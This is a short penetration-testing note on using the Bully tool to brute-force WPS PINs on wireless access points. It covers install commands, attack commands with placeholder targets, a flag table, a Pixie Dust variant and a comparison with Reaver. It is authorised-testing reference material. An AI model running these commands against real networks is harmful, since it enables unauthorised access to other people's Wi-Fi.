---
tags: [pentest, wireless, wps, bully, brute-force, both, initial-access]
tool: bully
phase: 5
---
# Bully — WPS Brute Force

Alternative WPS PIN brute-force tool. Sometimes works where Reaver fails, especially against APs with unusual WPS implementations.

[[10 - Wireless/00 - README|Folder index]]

## Install / verify

```bash
which bully
sudo apt install bully
```

## Basic attack

```bash
sudo bully -b <BSSID> -c <CH> -d wlan0mon -v 3
```

| Flag | Meaning |
| --- | --- |
| `-b` | Target BSSID |
| `-c` | Channel |
| `-d` | Monitor interface |
| `-v 3` | Verbosity (1-3) |
| `-p <PIN>` | Start from a specific PIN |
| `-l 3` | Lockout wait time (seconds) |
| `-S` | Use sequential PINs (instead of random) |
| `-5` | Timeout for stage M5 (seconds) |
| `-1` | Timeout for stage M1 (seconds) |
| `-F` | Force — continue despite failures |

## Pixie Dust with Bully

```bash
sudo bully -b <BSSID> -c <CH> -d wlan0mon -v 3 -S
# Bully detects Pixie Dust automatically with some versions
```

## When to use Bully vs Reaver

| Situation | Use |
| --- | --- |
| First attempt | Reaver with `-K` (Pixie Dust) |
| Reaver hangs or errors | Try Bully |
| AP has unusual WPS timing | Bully (better timeout handling) |
| Need Pixie Dust specifically | Reaver `-K` or dedicated Pixie Dust tools |

## See also

- [[09 - Reaver WPS]]
- [[11 - Pixie Dust Attack]]
- [[14 - wash WPS Discovery]]
